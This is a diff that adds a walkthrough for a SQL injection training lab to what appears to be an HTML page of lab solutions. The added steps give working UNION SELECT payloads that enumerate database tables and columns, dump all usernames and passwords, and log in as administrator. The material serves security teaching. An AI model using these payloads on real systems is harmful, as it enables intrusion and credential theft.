@@ -127,6 +127,41 @@
       </ol>
     </div>
   </div>
+  
+  <!-- SQL Lab 7 -->
+  <div class="lab-item">
+    <div class="lab-title">
+      <strong>Lab 7: SQL injection attack, listing the database contents on non-Oracle databases.</strong>
+      <i class="fas fa-angle-down"></i>
+    </div>
+    <div class="lab-body">
+      <ol type="1">
+        <li>Use Burp Suite to intercept and modify the request that sets the product category filter.</li>
+        <li>Determine the number of columns that are being returned by the query and which columns contain text data. 
+          Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: 
+          <b>'+UNION+SELECT+'abc','def'--</b>. 
+        </li>
+        <li>Use the following payload to retrieve the list of tables in the database: <b>'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--</b></li>
+        <li>
+          Find the name of the table containing user credentials.
+        </li>
+        <li>
+          Use the following payload (replacing the table name) to retrieve the details of the columns in the table: 
+          <b>'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--</b>
+        </li>
+        <li>
+          Find the names of the columns containing usernames and passwords.
+        </li>
+        <li>
+          Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users: 
+          <b>'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--</b>
+        </li>
+        <li>
+          Find the password for the administrator user, and use it to log in.
+        </li>
+      </ol>
+    </div>
+  </div>
 
 <!-- SQL Lab 9 -->
 <div class="lab-item">
